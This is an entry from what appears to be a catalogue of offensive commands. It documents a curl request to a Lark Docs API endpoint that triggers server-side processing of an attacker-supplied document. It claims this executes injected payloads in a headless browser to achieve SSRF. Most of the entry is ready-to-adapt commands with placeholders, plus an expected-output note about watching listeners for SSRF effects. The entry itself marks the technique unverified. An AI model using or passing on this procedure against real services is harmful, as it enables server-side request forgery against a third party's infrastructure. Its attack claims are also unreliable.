---
data: >-
  curl -X POST 'https://docs.larksuite.com/api/v1/documents/process' -H
  'Authorization: Bearer YOUR_TOKEN' -d '{"doc_id": "MALICIOUS_DOC_ID"}'
tags:
  - ssrf
  - api
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-13T23:56:19.916Z'
id: 2672781a-c8d1-4526-a0e3-47bed88fc72f
verified: false
validated: true
submitted: true
---
# trigger-document-process

## Command

```bash
curl -X POST 'https://docs.larksuite.com/api/v1/documents/process' -H 'Authorization: Bearer YOUR_TOKEN' -d '{"doc_id": "MALICIOUS_DOC_ID"}'
```

## Description

This curl command simulates triggering server-side processing of a Lark Docs document via API, which can execute injected payloads in a headless browser context to achieve SSRF. Replace placeholders with actual values.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | HTTP method | Yes |
| `URL` | Lark API endpoint | Yes |
| `-H 'Authorization: Bearer TOKEN'` | Auth header | Yes |
| `-d 'JSON'` | Document ID payload | Yes |

## Examples

### Basic Usage

```bash
curl -X POST 'https://docs.larksuite.com/api/v1/documents/process' -H 'Authorization: Bearer abc123' -d '{"doc_id": "doc-456"}'
```

### Advanced Usage

```bash
curl -X POST 'https://docs.larksuite.com/api/v1/documents/process' -H 'Authorization: Bearer abc123' -H 'Content-Type: application/json' -d '{"doc_id": "doc-456", "render": true}'
```

## Expected Output

HTTP 200 response indicating successful processing, with potential SSRF side effects observable in logs or listeners.

## Related

- [[Related Procedure]]
